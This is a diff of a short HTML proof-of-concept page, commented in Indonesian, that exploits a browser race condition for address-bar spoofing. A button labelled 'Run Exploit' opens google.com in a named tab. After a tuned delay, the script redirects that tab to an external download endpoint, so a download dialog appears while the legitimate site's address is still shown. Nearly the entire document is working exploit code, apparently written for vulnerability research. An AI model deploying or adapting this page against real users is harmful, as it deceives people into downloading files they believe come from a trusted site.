@@ -1,35 +1,38 @@
 <html>
- <head>
+<head>
   <meta charset="utf-8">
+  <title>UI Spoofing Race Condition PoC</title>
   <style>
     .button {
-      background-color: #4CAF50;
+      background-color: #d9534f;
       border: none;
       color: white;
       padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
       font-size: 16px;
-      margin: 4px 2px;
       cursor: pointer;
+      border-radius: 5px;
     }
   </style>
- </head>
- <body>
+</head>
+<body>
   <script>
-    function a(){
-      // 1. Buka situs asli di tab baru dengan nama target 'x'
-      window.open('https://www.google.com/intl/id_id/chrome/', 'x');
-      
-      // 2. Tunggu 5 detik, lalu paksa tab 'x' tersebut untuk menavigasi ke malformed data URL
-      setTimeout(function(){
-        window.open('data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=', 'x');
-      }, 5000);
+    function triggerSpoof() {
+      // 1. Buka situs sah di tab baru. Peramban akan mulai memuat dan mengubah Address Bar.
+      var spoofWindow = window.open('https://www.google.com', 'spoofTab');
+
+      // 2. Race Condition: Gunakan setTimeout untuk mengeksploitasi jeda waktu perenderan.
+      // Waktu (ms) ini mungkin perlu disesuaikan (di-fuzzing) tergantung kecepatan koneksi dan browser target.
+      setTimeout(function() {
+        // 3. Paksa tab tersebut menavigasi ke URL berbahaya yang memicu unduhan.
+        // Ganti URL ini dengan endpoint server Anda sendiri.
+        spoofWindow.location = 'https://k4tedu.github.io/spoof/trigger_download.php'; 
+      }, 1500); 
     }
   </script>
+  
   <center>
-    <input type="button" class="button" value="Download From Original Site" onclick="a()">
+    <h2>Test Case: Pending Navigation & Download Dialog</h2>
+    <input type="button" class="button" value="Jalankan Eksploitasi" onclick="triggerSpoof()">
   </center>
- </body>
+</body>
 </html>
